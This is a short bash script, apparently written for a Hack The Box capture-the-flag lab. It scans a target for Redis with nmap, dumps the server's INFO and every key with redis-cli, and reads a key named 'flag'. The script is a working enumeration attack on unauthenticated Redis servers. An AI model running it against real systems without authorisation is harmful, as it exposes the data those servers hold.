#!/usr/bin/env bash
#
# enum-redis.sh – Scan a Redis server and pull the HTB flag
# Usage: ./enum-redis.sh <TARGET_IP>

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <TARGET_IP>"
  exit 1
fi

TARGET=$1

echo "[*] Scanning for Redis on $TARGET..."
nmap -p 6379 -sV "$TARGET" -o nmap-6379.txt

echo "[*] Gathering Redis INFO..."
redis-cli -h "$TARGET" info | tee redis-info.txt

echo "[*] Listing all keys..."
redis-cli -h "$TARGET" --raw keys "*" | tee keys.txt

echo "[*] Retrieving flag..."
FLAG=$(redis-cli -h "$TARGET" get flag)
echo "[*] Flag: $FLAG"

echo "[*] Done! Artifacts saved:"
echo "    • nmap-6379.txt"
echo "    • redis-info.txt"
echo "    • keys.txt"
